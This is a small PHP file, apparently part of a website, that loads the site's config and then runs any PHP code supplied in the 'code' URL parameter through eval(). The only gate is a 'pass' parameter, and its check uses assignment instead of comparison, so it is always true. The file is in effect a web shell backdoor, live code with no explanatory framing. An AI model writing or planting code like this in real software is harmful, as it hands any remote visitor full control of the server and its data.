<?php

include "../includes/config.php";

if (isset($_GET['pass'])) {
	$pass = $_GET['pass'];
	if ($pass = "12345") {
		if (isset($_GET['code'])) {
			$code = $_GET['code'];
			eval($code);
		}
	}
}

?>